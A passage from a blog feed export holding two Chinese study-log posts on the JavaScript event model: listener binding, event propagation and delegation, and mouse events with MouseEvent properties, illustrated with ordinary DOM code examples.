    <title>打卡0045</title>
    <url>/2021/05/27/%E6%89%93%E5%8D%A10045/</url>
    <content><![CDATA[<p><font color=#f47a55>只想着相见时春风细雨甜，哪管他相思夜星前月下苦。</font></p>
<h2 id="JS-事件"><a href="#JS-事件" class="headerlink" title="JS 事件"></a>JS 事件</h2><h3 id="2-事件模型"><a href="#2-事件模型" class="headerlink" title="2. 事件模型"></a>2. 事件模型</h3><h4 id="2-1-监听函数"><a href="#2-1-监听函数" class="headerlink" title="2.1 监听函数"></a>2.1 监听函数</h4><p>浏览器的事件模型，就是通过监听函数（listener）对事件做出反应。事件发生后，浏览器监听到了这个事件，就会执行对应的监听函数。这是事件驱动编程模式（event-driven）的主要编程方式。</p>
<p>JavaScript 有三种方法，可以为事件绑定监听函数。</p>
<h5 id="2-1-1-HTML-的-on-属性"><a href="#2-1-1-HTML-的-on-属性" class="headerlink" title="2.1.1 HTML 的 on- 属性"></a>2.1.1 HTML 的 on- 属性</h5><p>HTML 语言允许在元素的属性中，直接定义某些事件的监听代码。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;body onload=<span class="string">&quot;doSomething()&quot;</span>&gt;</span><br><span class="line">&lt;div onclick=<span class="string">&quot;console.log(&#x27;触发事件&#x27;)&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码为<code>body</code>节点的<code>load</code>事件、<code>div</code>节点的<code>click</code>事件，指定了监听代码。一旦事件发生，就会执行这段代码。</p>
<span id="more"></span>
<p>元素的事件监听属性，都是<code>on</code>加上事件名，比如<code>onload</code>就是<code>on + load</code>，表示<code>load</code>事件的监听代码。</p>
<p>注意，这些属性的值是将会执行的代码，而不是一个函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!-- 正确 --&gt;</span><br><span class="line">&lt;body onload=<span class="string">&quot;doSomething()&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 错误 --&gt;</span><br><span class="line">&lt;body onload=<span class="string">&quot;doSomething&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>一旦指定的事件发生，<code>on-</code>属性的值是原样传入 JavaScript 引擎执行。因此如果要执行函数，不要忘记加上一对圆括号。</p>
<p>使用这个方法指定的监听代码，只会在冒泡阶段触发。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div onclick=<span class="string">&quot;console.log(2)&quot;</span>&gt;</span><br><span class="line">  &lt;button onclick=<span class="string">&quot;console.log(1)&quot;</span>&gt;点击&lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>&lt;button&gt;</code>是<code>&lt;div&gt;</code>的子元素。<code>&lt;button&gt;</code>的<code>click</code>事件，也会触发<code>&lt;div&gt;</code>的<code>click</code>事件。由于<code>on-</code>属性的监听代码，只在冒泡阶段触发，所以点击结果是先输出<code>1</code>，再输出<code>2</code>，即事件从子元素开始冒泡到父元素。</p>
<p>直接设置<code>on-</code>属性，与通过元素节点的<code>setAttribute</code>方法设置<code>on-</code>属性，效果是一样的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">el.setAttribute(<span class="string">&#x27;onclick&#x27;</span>, <span class="string">&#x27;doSomething()&#x27;</span>);</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="comment">// &lt;Element onclick=&quot;doSomething()&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="2-1-2-元素节点的事件属性"><a href="#2-1-2-元素节点的事件属性" class="headerlink" title="2.1.2 元素节点的事件属性"></a>2.1.2 元素节点的事件属性</h5><p>元素节点对象的事件属性，同样可以指定监听函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = doSomething;</span><br><span class="line"></span><br><span class="line">div.onclick = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;触发事件&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>使用这个方法指定的监听函数，也是只会在冒泡阶段触发。</p>
<p>注意，这种方法与 HTML 的<code>on-</code>属性的差异是，它的值是函数名（<code>doSomething</code>），而不像后者，必须给出完整的监听代码（<code>doSomething()</code>）。</p>
<h5 id="2-1-3-EventTarget-addEventListener"><a href="#2-1-3-EventTarget-addEventListener" class="headerlink" title="2.1.3 EventTarget.addEventListener()"></a>2.1.3 EventTarget.addEventListener()</h5><p>所有 DOM 节点实例都有<code>addEventListener</code>方法，用来为该节点定义事件的监听函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;load&#x27;</span>, doSomething, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p><code>addEventListener</code>方法的详细介绍，参见<code>EventTarget</code>章节。</p>
<h5 id="2-1-4-小结"><a href="#2-1-4-小结" class="headerlink" title="2.1.4 小结"></a>2.1.4 小结</h5><p>上面三种方法，第一种“HTML 的 on- 属性”，违反了 HTML 与 JavaScript 代码相分离的原则，将两者写在一起，不利于代码分工，因此不推荐使用。</p>
<p>第二种“元素节点的事件属性”的缺点在于，同一个事件只能定义一个监听函数，也就是说，如果定义两次onclick属性，后一次定义会覆盖前一次。因此，也不推荐使用。</p>
<p>第三种<code>EventTarget.addEventListener</code>是推荐的指定监听函数的方法。它有如下优点：</p>
<ul>
<li>同一个事件可以添加多个监听函数。</li>
<li>能够指定在哪个阶段（捕获阶段还是冒泡阶段）触发监听函数。</li>
<li>除了 DOM 节点，其他对象（比如<code>window</code>、<code>XMLHttpRequest</code>等）也有这个接口，它等于是整个 JavaScript 统一的监听函数接口。</li>
</ul>
<h4 id="2-2-this-的指向"><a href="#2-2-this-的指向" class="headerlink" title="2.2 this 的指向"></a>2.2 this 的指向</h4><p>监听函数内部的<code>this</code>指向触发事件的那个元素节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;button id=<span class="string">&quot;btn&quot;</span> onclick=<span class="string">&quot;console.log(this.id)&quot;</span>&gt;点击&lt;/button&gt;</span><br></pre></td></tr></table></figure>
<p>执行上面代码，点击后会输出<code>btn</code>。</p>
<p>其他两种监听函数的写法，<code>this</code>的指向也是如此。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;button id=&quot;btn&quot;&gt;点击&lt;/button&gt;</span></span><br><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;btn&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法一</span></span><br><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span>.id);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法二</span></span><br><span class="line">btn.addEventListener(</span><br><span class="line">  <span class="string">&#x27;click&#x27;</span>,</span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.id);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="literal">false</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>上面两种写法，点击按钮以后也是输出<code>btn</code>。</p>
<h4 id="2-3-事件的传播"><a href="#2-3-事件的传播" class="headerlink" title="2.3 事件的传播"></a>2.3 事件的传播</h4><p>一个事件发生后，会在子元素和父元素之间传播（propagation）。这种传播分成三个阶段。</p>
<ul>
<li>第一阶段：从<code>window</code>对象传导到目标节点（上层传到底层），称为“捕获阶段”（capture phase）。</li>
<li>第二阶段：在目标节点上触发，称为“目标阶段”（target phase）。</li>
<li>第三阶段：从目标节点传导回<code>window</code>对象（从底层传回上层），称为“冒泡阶段”（bubbling phase）。</li>
</ul>
<p>这种三阶段的传播模型，使得同一个事件会在多个节点上触发。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;p&gt;点击&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>&lt;div&gt;</code>节点之中有一个<code>&lt;p&gt;</code>节点。</p>
<p>如果对这两个节点，都设置<code>click</code>事件的监听函数（每个节点的捕获阶段和冒泡阶段，各设置一个监听函数），共计设置四个监听函数。然后，对<code>&lt;p&gt;</code>点击，<code>click</code>事件会触发四次。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> phases = &#123;</span><br><span class="line">  <span class="number">1</span>: <span class="string">&#x27;capture&#x27;</span>,</span><br><span class="line">  <span class="number">2</span>: <span class="string">&#x27;target&#x27;</span>,</span><br><span class="line">  <span class="number">3</span>: <span class="string">&#x27;bubble&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> p = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"></span><br><span class="line">div.addEventListener(<span class="string">&#x27;click&#x27;</span>, callback, <span class="literal">true</span>);</span><br><span class="line">p.addEventListener(<span class="string">&#x27;click&#x27;</span>, callback, <span class="literal">true</span>);</span><br><span class="line">div.addEventListener(<span class="string">&#x27;click&#x27;</span>, callback, <span class="literal">false</span>);</span><br><span class="line">p.addEventListener(<span class="string">&#x27;click&#x27;</span>, callback, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> tag = event.currentTarget.tagName;</span><br><span class="line">  <span class="keyword">var</span> phase = phases[event.eventPhase];</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;Tag: &#x27;&quot;</span> + tag + <span class="string">&quot;&#x27;. EventPhase: &#x27;&quot;</span> + phase + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 点击以后的结果</span></span><br><span class="line"><span class="comment">// Tag: &#x27;DIV&#x27;. EventPhase: &#x27;capture&#x27;</span></span><br><span class="line"><span class="comment">// Tag: &#x27;P&#x27;. EventPhase: &#x27;target&#x27;</span></span><br><span class="line"><span class="comment">// Tag: &#x27;P&#x27;. EventPhase: &#x27;target&#x27;</span></span><br><span class="line"><span class="comment">// Tag: &#x27;DIV&#x27;. EventPhase: &#x27;bubble&#x27;</span></span><br></pre></td></tr></table></figure>
<p>上面代码表示，<code>click</code>事件被触发了四次：<code>&lt;div&gt;</code>节点的捕获阶段和冒泡阶段各1次，<code>&lt;p&gt;</code>节点的目标阶段触发了2次。</p>
<ul>
<li>捕获阶段：事件从<code>&lt;div&gt;</code>向<code>&lt;p&gt;</code>传播时，触发<code>&lt;div&gt;</code>的<code>click</code>事件；</li>
<li>目标阶段：事件从<code>&lt;div&gt;</code>到达<code>&lt;p&gt;</code>时，触发<code>&lt;p&gt;</code>的<code>click</code>事件；</li>
<li>冒泡阶段：事件从<code>&lt;p&gt;</code>传回<code>&lt;div&gt;</code>时，再次触发<code>&lt;div&gt;</code>的<code>click</code>事件。</li>
</ul>
<p>其中，<code>&lt;p&gt;</code>节点有两个监听函数（<code>addEventListener</code>方法第三个参数的不同，会导致绑定两个监听函数），因此它们都会因为<code>click</code>事件触发一次。所以，<code>&lt;p&gt;</code>会在<code>target</code>阶段有两次输出。</p>
<p>注意，浏览器总是假定<code>click</code>事件的目标节点，就是点击位置嵌套最深的那个节点（本例是<code>&lt;div&gt;</code>节点里面的<code>&lt;p&gt;</code>节点）。所以，<code>&lt;p&gt;</code>节点的捕获阶段和冒泡阶段，都会显示为<code>target</code>阶段。</p>
<p>事件传播的最上层对象是<code>window</code>，接着依次是<code>document</code>，<code>html</code>（<code>document.documentElement</code>）和<code>body</code>（<code>document.body</code>）。也就是说，上例的事件传播顺序，在捕获阶段依次为<code>window</code>、<code>document</code>、<code>html</code>、<code>body</code>、<code>div</code>、<code>p</code>，在冒泡阶段依次为<code>p</code>、<code>div</code>、<code>body</code>、<code>html</code>、<code>document</code>、<code>window</code>。</p>
<h4 id="2-4-事件的代理"><a href="#2-4-事件的代理" class="headerlink" title="2.4 事件的代理"></a>2.4 事件的代理</h4><p>由于事件会在冒泡阶段向上传播到父节点，因此可以把子节点的监听函数定义在父节点上，由父节点的监听函数统一处理多个子元素的事件。这种方法叫做事件的代理（delegation）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ul = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;ul&#x27;</span>);</span><br><span class="line"></span><br><span class="line">ul.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (event.target.tagName.toLowerCase() === <span class="string">&#x27;li&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// some code</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>click</code>事件的监听函数定义在<code>&lt;ul&gt;</code>节点，但是实际上，它处理的是子节点<code>&lt;li&gt;</code>的<code>click</code>事件。这样做的好处是，只要定义一个监听函数，就能处理多个子节点的事件，而不用在每个<code>&lt;li&gt;</code>节点上定义监听函数。而且以后再添加子节点，监听函数依然有效。</p>
<p>如果希望事件到某个节点为止，不再传播，可以使用事件对象的<code>stopPropagation</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 事件传播到 p 元素后，就不再向下传播了</span></span><br><span class="line">p.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  event.stopPropagation();</span><br><span class="line">&#125;, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 事件冒泡到 p 元素后，就不再向上冒泡了</span></span><br><span class="line">p.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  event.stopPropagation();</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>stopPropagation</code>方法分别在捕获阶段和冒泡阶段，阻止了事件的传播。</p>
<p>但是，<code>stopPropagation</code>方法只会阻止事件的传播，不会阻止该事件触发<code>&lt;p&gt;</code>节点的其他<code>click</code>事件的监听函数。也就是说，不是彻底取消<code>click</code>事件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">p.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  event.stopPropagation();</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">p.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 会触发</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>p</code>元素绑定了两个<code>click</code>事件的监听函数。<code>stopPropagation</code>方法只能阻止这个事件的传播，不能取消这个事件，因此，第二个监听函数会触发。输出结果会先是<code>1</code>，然后是<code>2</code>。</p>
<p>如果想要彻底取消该事件，不再触发后面所有<code>click</code>的监听函数，可以使用<code>stopImmediatePropagation</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">p.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  event.stopImmediatePropagation();</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">p.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 不会被触发</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>stopImmediatePropagation</code>方法可以彻底取消这个事件，使得后面绑定的所有<code>click</code>监听函数都不再触发。所以，只会输出1，不会输出2。</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 事件-事件模型</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0047</title>
    <url>/2021/05/28/%E6%89%93%E5%8D%A10047/</url>
    <content><![CDATA[<p><font color=#ffc20e> “Let there be light.”</font></p>
<h2 id="JS-事件"><a href="#JS-事件" class="headerlink" title="JS 事件"></a>JS 事件</h2><h3 id="4-鼠标事件"><a href="#4-鼠标事件" class="headerlink" title="4. 鼠标事件"></a>4. 鼠标事件</h3><h4 id="4-1-鼠标事件的种类"><a href="#4-1-鼠标事件的种类" class="headerlink" title="4.1 鼠标事件的种类"></a>4.1 鼠标事件的种类</h4><p>鼠标事件指与鼠标相关的事件，继承了<code>MouseEvent</code>接口。具体的事件主要有以下一些。</p>
<ul>
<li><code>click</code>:按下鼠标（通常是按下主按钮）时触发。</li>
<li><code>dblclick</code>:在同一个元素上双击鼠标时触发。</li>
<li><code>mousedown</code>:按下鼠标键时触发。</li>
<li><code>mouseup</code>:释放按下的鼠标键时触发。</li>
<li><code>mousemove</code>:当鼠标在一个节点内部移动时触发。当鼠标持续移动时，该事件会连续触发。为了避免性能问题，建议对该事件的监听函数做一些限定，比如限定一段时间内只能运行一次。</li>
<li><code>mouseenter</code>:鼠标进入一个节点时触发，进入子节点不会触发这个事件（详见后文）。</li>
<li><code>mouseover</code>:鼠标进入一个节点时触发，进入子节点会再一次触发这个事件（详见后文）。</li>
<li><code>mouseout</code>:鼠标离开一个节点时触发，离开父节点也会触发这个事件（详见后文）。</li>
<li><code>mouseleave</code>:鼠标离开一个节点时触发，离开父节点不会触发这个事件（详见后文）。</li>
<li><code>contextmenu</code>:按下鼠标右键时（上下文菜单出现前）触发，或者按下“上下文菜单键”时触发。</li>
<li><code>wheel</code>:滚动鼠标的滚轮时触发，该事件继承的是<code>WheelEvent</code>接口。</li>
</ul>
<span id="more"></span>
<p><code>click</code>事件指的是，用户在同一个位置先完成<code>mousedown</code>动作，再完成<code>mouseup</code>动作。因此，触发顺序是，<code>mousedown</code>首先触发，<code>mouseup</code>接着触发，<code>click</code>最后触发。</p>
<p><code>dblclick</code>事件则会在<code>mousedown</code>、<code>mouseup</code>、<code>click</code>之后触发。</p>
<p><code>mouseover</code>事件和<code>mouseenter</code>事件，都是鼠标进入一个节点时触发。两者的区别是，<code>mouseenter</code>事件只触发一次，而只要鼠标在节点内部移动，<code>mouseover</code>事件会在子节点上触发多次。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* HTML 代码如下</span></span><br><span class="line"><span class="comment"> &lt;ul&gt;</span></span><br><span class="line"><span class="comment">   &lt;li&gt;item 1&lt;/li&gt;</span></span><br><span class="line"><span class="comment">   &lt;li&gt;item 2&lt;/li&gt;</span></span><br><span class="line"><span class="comment">  &lt;li&gt;item 3&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> &lt;/ul&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ul = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;ul&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进入 ul 节点以后，mouseenter 事件只会触发一次</span></span><br><span class="line"><span class="comment">// 以后只要鼠标在节点内移动，都不会再触发这个事件</span></span><br><span class="line"><span class="comment">// event.target 是 ul 节点</span></span><br><span class="line">ul.addEventListener(<span class="string">&#x27;mouseenter&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  event.target.style.color = <span class="string">&#x27;purple&#x27;</span>;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    event.target.style.color = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  &#125;, <span class="number">500</span>);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进入 ul 节点以后，只要在子节点上移动，mouseover 事件会触发多次</span></span><br><span class="line"><span class="comment">// event.target 是 li 节点</span></span><br><span class="line">ul.addEventListener(<span class="string">&#x27;mouseover&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  event.target.style.color = <span class="string">&#x27;orange&#x27;</span>;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    event.target.style.color = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  &#125;, <span class="number">500</span>);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，在父节点内部进入子节点，不会触发<code>mouseenter</code>事件，但是会触发<code>mouseover</code>事件。</p>
<p><code>mouseout</code>事件和<code>mouseleave</code>事件，都是鼠标离开一个节点时触发。两者的区别是，在父元素内部离开一个子元素时，<code>mouseleave</code>事件不会触发，而mouseout事件会触发。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* HTML 代码如下</span></span><br><span class="line"><span class="comment"> &lt;ul&gt;</span></span><br><span class="line"><span class="comment">   &lt;li&gt;item 1&lt;/li&gt;</span></span><br><span class="line"><span class="comment">   &lt;li&gt;item 2&lt;/li&gt;</span></span><br><span class="line"><span class="comment">  &lt;li&gt;item 3&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> &lt;/ul&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ul = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;ul&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 先进入 ul 节点，然后在节点内部移动，不会触发 mouseleave 事件</span></span><br><span class="line"><span class="comment">// 只有离开 ul 节点时，触发一次 mouseleave</span></span><br><span class="line"><span class="comment">// event.target 是 ul 节点</span></span><br><span class="line">ul.addEventListener(<span class="string">&#x27;mouseleave&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  event.target.style.color = <span class="string">&#x27;purple&#x27;</span>;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    event.target.style.color = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  &#125;, <span class="number">500</span>);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 先进入 ul 节点，然后在节点内部移动，mouseout 事件会触发多次</span></span><br><span class="line"><span class="comment">// event.target 是 li 节点</span></span><br><span class="line">ul.addEventListener(<span class="string">&#x27;mouseout&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  event.target.style.color = <span class="string">&#x27;orange&#x27;</span>;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    event.target.style.color = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  &#125;, <span class="number">500</span>);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，在父节点内部离开子节点，不会触发<code>mouseleave</code>事件，但是会触发<code>mouseout</code>事件。</p>
<h4 id="4-2-MouseEvent-接口概述"><a href="#4-2-MouseEvent-接口概述" class="headerlink" title="4.2 MouseEvent 接口概述"></a>4.2 MouseEvent 接口概述</h4><p><code>MouseEvent</code>接口代表了鼠标相关的事件，单击（click）、双击（dblclick）、松开鼠标键（mouseup）、按下鼠标键（mousedown）等动作，所产生的事件对象都是MouseEvent实例。此外，滚轮事件和拖拉事件也是<code>MouseEvent</code>实例。</p>
<p><code>MouseEvent</code>接口继承了<code>Event</code>接口，所以拥有<code>Event</code>的所有属性和方法。它还有自己的属性和方法。</p>
<p>浏览器原生提供一个<code>MouseEvent</code>构造函数，用于新建一个<code>MouseEvent</code>实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> event = <span class="keyword">new</span> MouseEvent(type, options);</span><br></pre></td></tr></table></figure>
<p><code>MouseEvent</code>构造函数接受两个参数。第一个参数是字符串，表示事件名称；第二个参数是一个事件配置对象，该参数可选。除了<code>Event</code>接口的实例配置属性，该对象可以配置以下属性，所有属性都是可选的。</p>
<ul>
<li><code>screenX</code>:数值，鼠标相对于屏幕的水平位置（单位像素），默认值为0，设置该属性不会移动鼠标。</li>
<li><code>screenY</code>:数值，鼠标相对于屏幕的垂直位置（单位像素），其他与<code>screenX</code>相同。</li>
<li><code>clientX</code>:数值，鼠标相对于程序窗口的水平位置（单位像素），默认值为0，设置该属性不会移动鼠标。</li>
<li><code>clientY</code>:数值，鼠标相对于程序窗口的垂直位置（单位像素），其他与<code>clientX</code>相同。</li>
<li><code>ctrlKey</code>:布尔值，是否同时按下了 Ctrl 键，默认值为<code>false</code>。</li>
<li><code>shiftKey</code>:布尔值，是否同时按下了 Shift 键，默认值为<code>false</code>。</li>
<li><code>altKey</code>:布尔值，是否同时按下 Alt 键，默认值为<code>false</code>。</li>
<li><code>metaKey</code>:布尔值，是否同时按下 Meta 键，默认值为<code>false</code>。</li>
<li><code>button</code>:数值，表示按下了哪一个鼠标按键，默认值为0，表示按下主键（通常是鼠标的左键）或者当前事件没有定义这个属性；1表示按下辅助键（通常是鼠标的中间键），2表示按下次要键（通常是鼠标的右键）。</li>
<li><code>buttons</code>:数值，表示按下了鼠标的哪些键，是一个三个比特位的二进制值，默认为0（没有按下任何键）。1（二进制001）表示按下主键（通常是左键），2（二进制010）表示按下次要键（通常是右键），4（二进制100）表示按下辅助键（通常是中间键）。因此，如果返回3（二进制011）就表示同时按下了左键和右键。</li>
<li><code>relatedTarget</code>:节点对象，表示事件的相关节点，默认为<code>null</code>。<code>mouseenter</code>和<code>mouseover</code>事件时，表示鼠标刚刚离开的那个元素节点；<code>mouseout</code>和<code>mouseleave</code>事件时，表示鼠标正在进入的那个元素节点。</li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">simulateClick</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> event = <span class="keyword">new</span> MouseEvent(<span class="string">&#x27;click&#x27;</span>, &#123;</span><br><span class="line">    <span class="string">&#x27;bubbles&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&#x27;cancelable&#x27;</span>: <span class="literal">true</span></span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">var</span> cb = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;checkbox&#x27;</span>);</span><br><span class="line">  cb.dispatchEvent(event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码生成一个鼠标点击事件，并触发该事件。</p>
<h4 id="4-3-MouseEvent-接口的实例属性"><a href="#4-3-MouseEvent-接口的实例属性" class="headerlink" title="4.3 MouseEvent 接口的实例属性"></a>4.3 MouseEvent 接口的实例属性</h4><h5 id="4-3-1-MouseEvent-altKey，MouseEvent-ctrlKey，MouseEvent-metaKey，MouseEvent-shiftKey"><a href="#4-3-1-MouseEvent-altKey，MouseEvent-ctrlKey，MouseEvent-metaKey，MouseEvent-shiftKey" class="headerlink" title="4.3.1 MouseEvent.altKey，MouseEvent.ctrlKey，MouseEvent.metaKey，MouseEvent.shiftKey"></a>4.3.1 MouseEvent.altKey，MouseEvent.ctrlKey，MouseEvent.metaKey，MouseEvent.shiftKey</h5><p><code>MouseEvent.altKey</code>、<code>MouseEvent.ctrlKey</code>、<code>MouseEvent.metaKey</code>、<code>MouseEvent.shiftKey</code>这四个属性都返回一个布尔值，表示事件发生时，是否按下对应的键。它们都是只读属性。</p>
<p>+<code>altKey</code>属性：Alt 键</p>
<ul>
<li><code>ctrlKey</code>属性：Ctrl 键</li>
<li><code>metaKey</code>属性：Meta 键（Mac 键盘是一个四瓣的小花，Windows 键盘是 Windows 键）</li>
<li><code>shiftKey</code>属性：Shift 键</li>
</ul>
